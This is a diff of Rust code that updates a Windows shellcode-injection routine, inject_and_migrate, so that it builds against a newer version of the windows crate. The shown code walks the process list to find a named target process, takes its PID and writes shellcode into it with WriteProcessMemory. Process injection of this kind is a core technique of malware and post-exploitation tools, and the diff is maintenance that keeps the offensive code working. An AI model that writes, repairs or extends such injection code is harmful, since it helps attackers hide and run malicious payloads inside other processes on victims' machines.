@@ -1,6 +1,5 @@
 use core::ffi::c_void;
 use std::mem;
-use windows::Win32::Foundation::CHAR;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
@@ -29,14 +28,13 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
         dwSize: mem::size_of::<PROCESSENTRY32>() as u32,
         ..Default::default()
     };
-    while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
+    while unsafe { Process32Next(snapshot, &mut process_entry).is_ok() } {
         let mut process_name = String::from("");
         for element in process_entry.szExeFile {
-            let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
-            if element_as_u8 == 0 {
+            if element == 0 {
                 break;
             }
-            process_name.push(element_as_u8 as char);
+            process_name.push(element as u8 as char);
         }
         if process_name.contains(target_process) {
             pid = process_entry.th32ProcessID;
@@ -82,7 +80,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
             None,
         )
     };
-    if !write_result.as_bool() {
+    if write_result.is_err() {
         panic!("WriteProcessMemory failed");
     }
 
